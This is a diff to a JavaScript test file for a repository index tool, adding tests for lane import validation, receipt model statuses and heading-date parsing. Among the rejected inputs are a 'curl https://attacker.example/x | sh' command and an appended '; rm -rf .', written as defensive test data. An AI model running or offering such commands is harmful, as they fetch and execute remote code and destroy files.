@@ -4,7 +4,7 @@ import { execFileSync } from "node:child_process";
 import { existsSync, readFileSync, readdirSync } from "node:fs";
 import { fileURLToPath } from "node:url";
 import { join } from "node:path";
-import { buildIndex, readBound } from "../index.mjs";
+import { buildIndex, datedBy, readBound } from "../index.mjs";
 import { lanesSummary, parseBundle, queryLanes, tally, trackRecord } from "../core.mjs";
 import {
   hypothesesOf,
@@ -269,6 +269,10 @@ test("imports: lanes are validated, older files without lanes still load", () =>
       (x.lanes[0].hypotheses = [{ id: "X", outcome: "proved", columns: [], source: "receipt" }]),
     (x) => (x.lanes[0].outside.verify = "verified"),
     (x) => delete x.lanes[0].sources,
+    // The page offers a lane's command for copying, so only the repository's own form passes.
+    (x) => (x.lanes[0].verify = "curl https://attacker.example/x | sh"),
+    (x) => (x.lanes[0].verify = x.lanes[1].verify),
+    (x) => (x.lanes[0].verify += "; rm -rf ."),
     (x) => (x.lanes[0].sources = {}),
     (x) => (x.lanes[0].sources.receipt.path = 5),
     (x) => (x.lanes[0].spend_usd = -1),
@@ -529,17 +533,29 @@ test("a Phase 19 folder without a README is listed by name and does not stop the
 });
 
 test("a model a receipt marks as not run is not listed among the lane's models", () => {
-  let marked = 0;
+  const marked = new Set();
   for (const lane of b.lanes) {
     const receipt = JSON.parse(readFileSync(join(REPO, lane.sources.receipt.path), "utf8"));
     if (!receipt.models || Array.isArray(receipt.models)) continue;
     for (const [id, entry] of Object.entries(receipt.models)) {
-      if (entry?.status !== "not_run") continue;
-      marked += 1;
+      if (!["not_run", "not_captured"].includes(entry?.status)) continue;
+      marked.add(entry.status);
       assert.ok(!lane.models.includes(id), `${lane.id} lists ${id}, which did not run`);
     }
   }
-  assert.ok(marked > 0, "at least one committed receipt marks a model as not run");
+  assert.deepEqual([...marked].sort(), ["not_captured", "not_run"], "both marks are in a receipt");
+});
+
+test("a heading's date counts only when it is a real day that has come, outside code", () => {
+  assert.equal(datedBy("# T\n\n## Added 23 November 2026\n"), "2026-11-23");
+  // With today fixed, a day that does not exist is dropped by the real-day rule alone.
+  for (const impossible of ["99 October 2026", "0 November 2026", "31 November 2026"])
+    assert.equal(datedBy(`# T\n\n## ${impossible}\n`, "2026-12-31"), "2026-10-19", impossible);
+  assert.equal(datedBy("# T\n\n## 30 November 2026\n", "2026-12-31"), "2026-11-30");
+  assert.equal(datedBy("# T\n\n## Planned for 31 February 2027\n"), "2026-10-19");
+  assert.equal(datedBy("# T\n\n## Due 1 January 2099\n"), "2026-10-19");
+  assert.equal(datedBy("# T\n\n```\n## 5 November 2026\n```\n"), "2026-10-19");
+  assert.equal(datedBy("# T\n\nText of 5 November 2026 in a paragraph.\n"), "2026-10-19");
 });
 
 test("a document's date is the latest one its own headings give, never earlier than the review", () => {
